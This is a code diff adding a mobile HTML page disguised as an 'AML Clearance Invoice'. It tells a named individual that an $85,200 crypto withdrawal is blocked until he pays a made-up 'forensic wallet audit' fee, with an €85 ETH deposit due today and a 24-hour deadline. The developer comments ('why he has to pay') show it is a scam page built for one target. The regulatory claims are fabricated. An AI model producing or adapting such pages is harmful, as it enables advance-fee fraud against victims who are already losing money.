@@ -1,0 +1,147 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+    <title>AML Clearance Invoice - Global Compliance</title>
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Roboto+Mono:wght@400;500&display=swap");
+
+      *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+      :root {
+        --bg-primary: #f4f6f9; --bg-card: #ffffff; --text-primary: #0f172a;
+        --text-secondary: #64748b; --accent-blue: #2563eb; --border-color: #e2e8f0;
+      }
+
+      html, body {
+        height: 100%; background: var(--bg-primary); font-family: "Inter", sans-serif;
+        color: var(--text-primary); display: flex; justify-content: center; align-items: flex-start;
+        min-height: 100vh;
+      }
+
+      .phone-frame { width: 100%; max-width: 420px; padding: 20px 16px 40px; display: flex; flex-direction: column; gap: 16px; }
+
+      /* THE EXPLANATION (Why he has to pay) */
+      .audit-notice { 
+        background: #f0fdf4; border: 1px solid #bbf7d0; border-left: 5px solid #16a34a; 
+        border-radius: 8px; padding: 20px; 
+      }
+      .audit-notice h3 { 
+        font-size: 15px; font-weight: 800; color: #166534; margin-bottom: 10px; 
+        display: flex; align-items: center; gap: 8px; text-transform: uppercase; letter-spacing: 0.03em; 
+      }
+      .audit-notice h3 svg { width: 20px; height: 20px; stroke: #16a34a; }
+      .audit-notice p { 
+        font-size: 14px; color: #14532d; line-height: 1.6; margin-bottom: 10px; 
+      }
+      .audit-notice p:last-child { margin-bottom: 0; }
+
+      /* INVOICE CARD */
+      .invoice-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); overflow: hidden; }
+      .invoice-top { background: #1e3a8a; color: white; padding: 24px; text-align: center; }
+      .invoice-top h1 { font-size: 18px; font-weight: 700; letter-spacing: 0.05em; margin-bottom: 4px; }
+      .invoice-top p { font-size: 12px; color: #93c5fd; }
+      .invoice-top .inv-num { font-family: "Roboto Mono", monospace; font-size: 13px; margin-top: 12px; background: rgba(0,0,0,0.2); display: inline-block; padding: 4px 10px; border-radius: 4px; }
+      
+      .invoice-body { padding: 24px; }
+      .section-title { font-size: 11px; font-weight: 700; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 12px; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; }
+      .info-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 13px; }
+      .info-label { color: var(--text-secondary); }
+      .info-value { font-weight: 600; color: var(--text-primary); text-align: right; max-width: 60%; }
+
+      /* PAYMENT BOXES */
+      .amount-box { background: #f8fafc; border: 1px solid var(--border-color); border-radius: 8px; padding: 16px; text-align: center; margin: 20px 0; }
+      .amount-label { font-size: 12px; color: var(--text-secondary); margin-bottom: 4px; }
+      .amount-fiat { font-size: 32px; font-weight: 800; color: var(--text-primary); }
+      .amount-crypto { font-size: 14px; font-weight: 600; color: var(--accent-blue); margin-top: 4px; }
+      
+      .partial-box { background: #ecfdf5; border: 1px solid #a7f3d0; border-radius: 8px; padding: 16px; text-align: center; margin-bottom: 20px; }
+      .partial-label { font-size: 12px; font-weight: 700; color: #047857; margin-bottom: 4px; text-transform: uppercase; }
+      .partial-amount { font-size: 32px; font-weight: 800; color: #065f46; }
+      .partial-note { font-size: 12px; color: #047857; margin-top: 6px; line-height: 1.4; font-weight: 500;}
+
+      /* DEADLINE NOTICE */
+      .deadline-box { 
+        display: flex; align-items: center; justify-content: center; gap: 8px; 
+        background: #fef2f2; border: 1px solid #fecaca; border-radius: 8px; 
+        padding: 12px; font-size: 13px; font-weight: 700; color: #dc2626; margin-bottom: 24px; 
+      }
+      .deadline-box svg { width: 18px; height: 18px; stroke: #dc2626; flex-shrink: 0; }
+
+      .btn-primary { width: 100%; background: var(--accent-blue); color: white; border: none; border-radius: 8px; padding: 16px; font-size: 15px; font-weight: 700; cursor: pointer; text-decoration: none; display: flex; justify-content: center; align-items: center; gap: 8px; transition: background 0.2s; }
+      .btn-primary:hover { background: #1d4ed8; }
+      .footer-text { text-align: center; font-size: 10px; color: var(--text-secondary); margin-top: 20px; line-height: 1.5; }
+    </style>
+  </head>
+  <body>
+    <div class="phone-frame">
+      
+      <!-- EXPLANATION: WHY HE IS BEING BILLED -->
+      <div class="audit-notice">
+        <h3>
+          <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          Audit Requirement Notice
+        </h3>
+        <p>
+          Your withdrawal request of <strong>$85,200.00</strong> has exceeded the standard Tier-1 AML limit. As a result, international financial regulations prohibit the direct release of these funds to your wallet.
+        </p>
+        <p>
+          To comply with cross-border laws, a mandatory Forensic Wallet Audit must be conducted by the Global AML Network. This audit verifies the source of funds and issues a legal Clearance Certificate, which allows our smart contract to legally release your money. The invoice below covers the required third-party audit fee.
+        </p>
+      </div>
+
+      <!-- INVOICE CARD -->
+      <div class="invoice-card">
+        <div class="invoice-top">
+          <h1>AML CLEARANCE INVOICE</h1>
+          <p>Issued by Global AML Compliance Network</p>
+          <div class="inv-num">INV-2026-991</div>
+        </div>
+
+        <div class="invoice-body">
+          
+          <div class="section-title">Client Information</div>
+          <div class="info-row">
+            <span class="info-label">Account Name:</span>
+            <span class="info-value">Norbert Orsolits</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">Pending Transfer:</span>
+            <span class="info-value">$85,200.00 USD</span>
+          </div>
+
+          <div class="section-title">Fee Breakdown</div>
+          <div class="amount-box">
+            <div class="amount-label">TOTAL CLEARANCE FEE</div>
+            <div class="amount-fiat">€485.00</div>
+            <div class="amount-crypto">0.16 ETH</div>
+          </div>
+
+          <!-- THE PARTIAL PAYMENT -->
+          <div class="partial-box">
+            <div class="partial-label">Audit Deposit Required (Today)</div>
+            <div class="partial-amount">€85.00</div>
+            <div class="partial-note">(Approx. 0.028 ETH). <br>Must be paid today to secure your audit slot and keep your $85,200 release active.</div>
+          </div>
+
+          <!-- DEADLINE NOTICE -->
+          <div class="deadline-box">
+            <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+            Payment must be received within 24 hours.
+          </div>
+
+          <!-- UPDATED BUTTON -->
+          <a href="paid.html" class="btn-primary">
+            Make Payment
+          </a>
+
+        </div>
+      </div>
+
+      <div class="footer-text">
+        This is an automated compliance invoice generated by the Global AML Network.<br> Do not reply directly to this invoice.
+      </div>
+
+    </div>
+  </body>
+</html>
